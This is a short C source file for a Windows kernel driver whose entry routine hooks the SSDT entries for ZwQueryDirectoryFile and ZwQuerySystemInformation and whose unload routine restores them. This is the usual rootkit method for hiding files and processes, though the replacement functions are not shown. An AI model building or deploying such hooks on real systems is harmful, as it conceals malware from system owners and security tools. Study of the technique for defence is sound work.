//#include "InlineHook.h"
#include "SSDTHook.h"
#include "Driver.h"

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)
{
	DbgPrint("Enter DriverEntry\n");

	NTSTATUS status = STATUS_SUCCESS;
	pDriverObject->DriverUnload = DriverUnload;
	for (ULONG i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		pDriverObject->MajorFunction[i] = DriverDefaultHandle;
	}

	//SSDTHook();
	g_pOldSSDTFunctionAddress1 = SSDTHook1("ZwQueryDirectoryFile", New_ZwQueryDirectoryFile);
	g_pOldSSDTFunctionAddress2 = SSDTHook1("ZwQuerySystemInformation", New_NtQuerySystemInformation);

	DbgPrint("Leave DriverEntry\n");
	return status;
}



VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	//SSDTUnhook();
	SSDTHook1("ZwQuerySystemInformation", g_pOldSSDTFunctionAddress2);
	SSDTHook1("ZwQueryDirectoryFile", g_pOldSSDTFunctionAddress1);
}


NTSTATUS DriverDefaultHandle(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	NTSTATUS status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}